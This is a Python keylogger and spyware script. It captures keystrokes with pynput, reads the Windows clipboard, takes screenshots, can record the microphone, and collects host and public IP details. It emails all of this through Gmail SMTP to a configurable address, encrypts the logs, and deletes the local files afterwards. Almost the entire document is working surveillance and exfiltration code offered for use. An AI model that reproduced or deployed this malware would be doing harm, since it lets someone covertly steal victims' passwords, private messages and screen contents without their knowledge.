# Importing libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket      # to collect information
import platform

import win32clipboard      # for clipboard information

from pynput import keyboard
from pynput.keyboard import Key, Listener

import time     # track changes as per time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "system_log.txt"
clipboard_info = "clipboard_log.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"


keys_info_e = "e_key_log.txt"
system_info_e = "e_system_log.txt"
clipboard_info_e = "e_clipboard_log.txt"

key = "ws8hdhed8eeneei"  #generate encryption key from cryptography folder


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3


email_address = " @gmail.com"   #email address with access by less common apps enabled 
password = " "

username = getpass.getuser()

toaddr = "  @gmail.com"


file_path = " "   #Add file path here
extend = "\\"
merge = file_path + extend

def send_mail(filename, attachment, toaddr ):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To']= toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_mail"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment,'rb')

    p= MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_mail(keys_info,file_path + extend + keys_info,toaddr)

def system_data():
    with open(file_path + extend + system_info,"a") as f:
        hostname = socket.gethostname()
        IPadd = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')

        except Exception :
            f.write("Unable to get Public IP Address")

        f.write("Processor : "+ (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + '\n')
        f.write("Host : " + hostname + '\n')
        f.write("Private IP Address : " + IPadd + '\n' )

system_data()

def clipboard_data():
    with open(file_path + extend + clipboard_info, "a") as f:
        try :
            win32clipboard.OpenClipboard()
            board_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard data : \n" + board_data)

        except :
            f.write("Clipboard can't be copied")

clipboard_data()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_info , fs, myrecording)

#microphone()

def ss() :
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

ss()


number_of_iterations = 0
currtime = time.time()
stoptime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end :
    count = 0
    keys = []


    def on_press(key):
        global keys, count,currtime

        print(key)
        keys.append(key)
        count += 1
        currtime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == keyboard.Key.esc:
            return False
        if currtime > stoptime :
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currtime > stoptime :

        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        ss()
        send_mail(screenshot_info, file_path + extend + screenshot_info, toaddr)
        clipboard_data()
        send_mail(clipboard_info, merge + clipboard_info, toaddr)
        send_mail(system_info, merge + system_info, toaddr)

        number_of_iterations += 1
        currtime = time.time()
        stoptime = time.time() + time_iteration

files_to_encrypt = [merge + system_info, merge + clipboard_info, merge + keys_info]
encrypted_file_name = [merge + system_info_e, merge + clipboard_info_e, merge + keys_info_e ]

count = 0

for encrypt_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name[count], 'wb') as f:
        f.write(encrypted)

    send_mail(encrypted_file_name[count], encrypted_file_name[count], toaddr)
    count += 1

time.sleep(120)   #time to send emails

# clean up the files for next track
delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
for file in delete_files:
    os.remove(merge + file)


